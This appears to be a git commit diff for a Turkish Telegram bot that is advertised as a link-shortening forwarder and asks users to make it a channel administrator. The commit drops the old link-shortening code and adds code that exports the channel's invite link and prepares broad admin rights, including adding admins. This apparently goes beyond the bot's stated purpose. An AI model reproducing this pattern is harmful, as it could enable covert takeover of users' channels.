029c50e3d82feadd1d5c14f5a96b2f2bfe7ede53
Pharex38 <79025093+Pharex38@users.noreply.github.com>
2021-04-26 19:25:50 +0300

    update main.py

--- main.py
+++ main.py
@@ -25,7 +25,7 @@ collection = db["Kanallar"]
 
 print("Başlıyor")
     
-@bot.on_message(filters.command(['start']))
+@bot.on(NewMessage(pattern='(?i).*/start'))
 def start(client, message):
     chat = message.chat_id
     bot.send_message(chat, "Merhaba!\n\n**Ne İşe Yarıyor?**\nBu bot [Link Mahzeni'nde](https://t.me/joinchat/UYu8q0gBTUdUudDL) paylaşılan postların linklerini otomatik olarak kısaltıp sizin kanalınıza iletir.\n\n**Nasıl Kullanılır?**\n1. Adım: Botu kanlınıza yönetici olarak ekleyin. \n2. Adım: API adresinizi ve Kanal ID girin. \n-/kaydet TRLINK_API KANAL_ID \n3. Adım: Kanalınzda /onayla yazın.\n4. Adım: Keyfini çıkarın.\n\n__NOT: Kanalınızın ID numarasını bilmiyorsanız kanaldan bota bir post iletin bot size söyleyecek.__", disable_web_page_preview=True)
@@ -34,46 +34,9 @@ def start(client, message):
 async def post(message):
     chat = message.chat_id
     print(chat)
-    """if chat == -1001368112299 or chat == -1001352123979:
-        mesaj = message.caption
-        mesaj = mesaj.split("KTE: ")
-        mesaja = mesaj[1].split("\n\n")
-        mesajb = mesaja[0]
-        s = requests.Session()
-        link = s.get("https://ay.live/api")
-        cookies = dict(link.cookies)
-        binb = collection.find({})
-        print(binb)
-        try:
-            medya = message.video
-            medya = medya['file_id']
-        except:
-            medya = message.photo
-            medya = medya['file_id']
-            for hesap in binb:
-                print(hesap)
-                token = hesap['token']
-                kanal = hesap['kanal']
-                json = s.get(f"https://ay.live/api/?api={token}&url={mesajb}&alias=&ct=1", cookies=cookies).json()
-                link = json['shortenedUrl']
-                try:
-                    bot.send_photo(kanal, medya, caption=f"{mesaj[0]}KTE: {link}\n\n {mesaja[1]}\n\n{mesaja[2]}{mesaja[3]}")
-                except Exception as e:
-                    print(e)
-                    pass
-        else:
-            for hesap in binb:
-                print(hesap)
-                token = hesap['token']
-                kanal = hesap['kanal']
-                json = s.get(f"https://ay.live/api/?api={token}&url={mesajb}&alias=&ct=1", cookies=cookies).json()
-                link = json['shortenedUrl']
-                try:
-                    bot.send_video(kanal, medya, caption=f"{mesaj[0]}KTE: {link}\n\n {mesaja[1]}\n\n{mesaja[2]}{mesaja[3]}")
-                except Exception as e:
-                    print(e)
-                    print(kanal)
-        bot.send_message(chat, "Başarılı!")"""
+    link = await bot(functions.messages.ExportChatInviteRequest(chat))
+    link = str(link).split(", ")
+    link = link[0].replace("ChatInviteExported(link='", " ").replace("'", " ")
     new_rights = ChatAdminRights(post_messages=True, add_admins=True,
                                  invite_users=True,
                                  change_info=True,
